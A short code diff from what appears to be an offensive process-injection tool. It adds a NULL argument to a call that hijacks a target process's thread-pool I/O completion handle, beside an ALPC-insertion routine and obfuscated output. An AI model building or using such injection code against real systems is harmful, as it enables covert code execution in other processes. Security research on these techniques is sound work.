@@ -333,7 +333,7 @@ static BOOL RemoteTpAlpcInsertionSetupExecution() {
 }
 
 void HijackHandles() {
-    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
+    m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid, NULL);
     if (m_p_hIoCompletion != NULL) {
         OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
     }
